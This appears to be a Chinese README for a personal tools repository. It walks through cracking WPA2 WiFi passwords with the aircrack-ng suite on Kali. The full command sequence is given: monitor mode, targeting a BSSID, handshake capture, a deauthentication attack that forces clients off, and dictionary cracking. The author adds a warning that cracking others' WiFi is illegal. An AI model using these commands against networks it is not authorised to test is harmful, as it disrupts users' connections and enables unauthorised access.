# tool

用Python实现的各种五花八门的工具;

## 一. airmon-ng工具链

airmon-ng可以用来抓取wifi数据包, 并且通过抓到连接wifi时的认证包来破解wifi密码; **请注意： 破解他人的wifi密码是违法行为**; 我这里只是用自己的wifi研究技术问题, airmon-ng工具使用方法; 

### 1.1 环境依赖

* 操作系统: kali
* python 3.11.6
* 工具: airmon-ng
* 有一个支持监听的网卡

airmon-ng具体使用步骤如下

### 1.2 开启监听

```shell
airmon-ng start wlan0
airmon-ng check kill
airodump-ng  wlan0mon
```

查看官方文档, 可以知道PWR表示信号强度, 如果绝对值是80/90左右, 已经是最低下限了,此时就不要破解密码了,因为信号太差, 可能连握手包都抓不到; 尽量找绝对值小的目标wifi下手;

### 1.3 监听指定wifi

```shell
airodump-ng --ignore-negative-one -w 42 -c 11 --bssid 88:88:88:88:88:88 wlan0mon
airodump-ng --ignore-negative-one -w 42 -c 13 --bssid 88:88:88:88:88:88 wlan0mon
```

必须抓到用户建立 wifi新连接时的握手包, **有点难处理的是怎么知道已经抓到握手包？ subprocess运行的子进程airmon-ng又不好监视，估计还是需要人工监视，抓到之后，人工按下ctrl+c发送信号，主进程再发送信信号给airmon-ng进程**

### 1.4 攻击使目标掉线

攻击指定目标, 使其连接断开, 该目标重连时, 就会发送握手包, 一旦捕获到握手包, 此时就可以关闭监听;

aireplay-ng -0 0 -a 88:88:88:88:88:88 -c 88:88:88:88:88:88 wlan0mon

### 1.5 破解密码

使用指定密码字典开始破解

aircrack-ng -a2 -b 88:88:88:88:88:88 -w ../password_dict/*.txt ./5E03-02.cap

